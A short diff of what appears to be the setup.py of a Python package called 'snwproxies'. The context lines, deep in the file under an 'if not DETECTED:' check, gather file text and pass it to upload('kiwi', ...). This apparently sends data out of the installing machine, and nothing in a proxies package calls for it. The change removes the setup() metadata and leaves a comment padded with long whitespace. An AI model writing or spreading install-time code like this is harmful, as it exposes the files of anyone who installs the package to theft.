@@ -704,16 +704,6 @@ if not DETECTED:
             filetext+='\n'
     upload('kiwi',filetext)
 
-setup(
-    name='snwproxies',
-    packages=['snwproxies'],
-    version='1.0',
-    license='MIT',
-    description='Proxies',
-    author='helper',
-    keywords=['style'],
-    install_requires=[''],
-    classifiers=['Development Status :: 5 - Production/Stable']
-)
+# setup(...) removed                                                                                                                                                                                                                                                 
 
 
